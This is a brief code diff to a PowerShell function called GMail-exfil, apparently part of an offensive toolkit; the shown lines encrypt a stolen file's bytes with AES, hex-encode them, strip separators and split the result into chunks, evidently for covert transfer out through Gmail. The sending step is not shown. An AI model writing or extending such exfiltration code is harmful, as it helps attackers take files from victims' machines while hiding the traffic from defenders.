@@ -8,6 +8,7 @@ function GMail-exfil
     $filename = Split-Path $file -leaf
     $bytes = AES $bytes
     $string = [System.BitConverter]::ToString($bytes);
+    $string = $string -replace '-','';
     $len = $string.Length;
     #$split = Get-Random -minimum 1 -maximum 250;
     $split = 3000
